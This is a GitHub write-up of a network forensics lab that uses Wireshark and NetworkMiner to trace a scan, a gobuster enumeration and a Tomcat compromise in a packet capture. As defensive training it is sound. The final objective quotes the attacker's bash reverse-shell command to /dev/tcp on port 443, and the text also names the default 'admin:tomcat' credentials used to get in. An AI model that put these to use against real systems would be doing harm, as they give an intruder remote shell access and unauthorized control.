# Network-Forensics-Lab

## Objective

The primary objective of the Network Forensics project was to employ a Network Protocol Analyzer system such as Wireshark for PCAP (Packet Capture) Analysis and Credential Analysis. The purpose of this practical experience was to equip me with the necessary skills and knowledge to proficiently capture, troubleshoot, analyze, and investigate network traffic for the purpose of identifying anomalies or security incidents, analyzing network traffic patterns, decoding protocols, and uncovering credential-based attacks

### Skills Learned


- Proficiency in identifying and interpreting anomalies within network traffic pattern
- Proficiency in analyzing and interpreting network logs.
- Proficiency in applying Wireshark for capturing and analyzing network traffic.
- Enhanced knowledge of network protocols and security vulnerabilities.
- Enhancing knowledge of network forensics methodologies and best practices
- Successfully applied credential analysis techniques to uncover unauthorized access attempts


### Tools Used

- Network forensic analysis tool for parsing PCAP files and extracting valuable information from captured network traffic.
- Network analysis tools (such as Wireshark and NetworkMiner) for capturing and examining network traffic.
- Telemetry generation tools to create realistic network traffic and attack scenarios.
- Open-source network intrusion detection system (NIDS) for real-time traffic analysis and packet logging.
- Network analysis framework (such as Zeek) for detailed insights into network traffic.


#### Steps

##### Objective 1: Given the suspicious activity detected on the web server, the pcap analysis shows a series of requests across various ports, suggesting a potential scanning behavior. My goal here was to identify the source IP address responsible for initiating these requests on our server.

- Employ NetworkMiner to pinpoint the IP address responsible for sending large packets. Assess whether this IP might belong to a potential attacker by scrutinizing the OS details to check for indications of network scanner usage. Furthermore, apply Wireshark to detect IP addresses that transmitted packets simultaneously but on distinct ports.

- Download the pcap file and extract with WinRAR. 

 <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/3311e44e-0152-46b9-8019-b7903934f1cd">

 <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/b824e42e-05db-4854-b7bf-f2814135da32">
 
- Open the file on NetworkMiner and proceed to identify the IP address that sent large packets, which was 14.0.0.120

  <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/466fe307-9ad1-4923-99ff-e582b0296870">

- Determine if the IP is from a potential attacker by examining the OS details to see if any network scanners were used. Discovered that the OS used is MAC and a scanning tool was also used (NMAP). 

 <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/71a7b082-d45a-4094-9056-aac4846e7588">

- By Employing Wireshark to identify IP addresses that sent packet at the same time but on different ports, the IP address responsible for initiating this request was discovered to be: 14.0.0.120 

##### Objective 2: Based on the identified IP address associated with the attacker, the city from which the attacker’s activities originated needs to be ascertained.

- Look up the IP address city by going to https://ipwhoisinfo.com 
 
 <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/bccf3fec-0e61-4daf-99d7-8356e12dcf40">

 <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/b665fcb6-81bf-4a4a-b442-e6ca49131b57">

 <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/267c359a-79c1-4615-8099-95a79e01df71">

- Carefully analyzing the results of the analysis reveals that the city from where the attacker’s activities originated from is Guangzhou in China
  
##### Objective 3: From the pcap analysis, multiple open ports were detected as a result of the attacker’s scan. Find out which of these ports provides access to the web admin panel.

- Access NetworkMiner.
  
 <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/e7533e2b-acc5-4f83-a34c-9300a492117b">
- Specifically, the IP address 10.0.0.112 [Tomcat Host Manager Application] [Tomcat Manager Application] (Linux). There you will find the open port which provides access to the web server admin panel is port 8080

<img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/4e9d39b5-b792-4c5d-bcb8-2d4a2446e8f8">

##### Objective 4: Find out which tool can be identified from the analysis that assisted the attacker in this enumeration process.

- Access NetworkMiner
  
 <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/d6841b16-f41c-47bf-b312-f7f7f5db7c10">
 
- Since the tools must have been used from the attacker’s machine, proceed to analyze the attacker’s machine 14.0.0.120 (other).

 <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/d1b7a542-2146-4a9c-a67a-272530bb412c">
 
- Click on Host Details to find out the details of the tool which must have been used to enumerate and uncover directories and files on the web server

 <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/0c54671e-cbf2-46a3-b699-81084c5fac9f">
 
“gobuster” is the tool that was used. Gobuster is a brute-force scanner tool used to enumerate directories and files of websites. 

##### Objective 5: Find out which specific directory associated with the admin panel the attacker was able to uncover. 

- Look for a packet that contains admin in the info section on Wireshark, right click on the packet with No. 20126 and follow the HTTP stream.
- Upon thorough observation, among the GET requests by the attacker, I discovered one of the directories “/manager” with an unauthorized response. 
 
   <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/fb615987-0ebb-41d9-8177-921a419bde69">
   
   <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/f908f7aa-a7c6-4891-93d2-937b7814efc7">

   <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/9e276350-8354-48ab-9459-2575e38a832a">

   <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/b07f9481-3bba-40c9-8ab7-65c7e01adcf2">


##### Objective 6: From the data, identify the correct username and password combination that the attacker successfully used for authorization.

- Look for the POST method used by filtering “http.request.method==”POST” on Wireshark.
- Double click on the result and scroll down the authorization section under HTTP and the credentials that the attacker used for authorization “admin:tomcat” is revealed.
 
<img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/b25de478-58b8-4e46-a9c5-d0ba30348b3d">

##### Objective 7: Identify the name of this malicious file from the captured data. 
 
- Replicate the steps outlined in objective 5. However, this time, examine the TCP stream instead of HTTP.
- The file name "JXQOZY.war" can be located on the same line as Content Disposition.
 
 <img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/973f9a54-9656-4b9a-ab4b-6c4ad822a85f">

<img src="https://github.com/CyberHaack/Network-Forensics-Lab/assets/163551482/d75a5f18-9917-4d07-a59e-787983a94c71">

##### Objective 8: From the analysis, determine the specific command they are scheduled to run to maintain their presence.

- The specific command is: /bin/bash -c -I >& /dev/tcp/14.0.0.120/443 0>&1’


### Associated Labs
- Poisoned Credentials Labs : 
<a href="https://cyberdefenders.org/blueteam-ctf-challenges/progress/Kachi/146/">View here</a>
- Wifi Security Forensics : <a href="https://attackdefense.com/challengedetails?cid=71">View here</a>






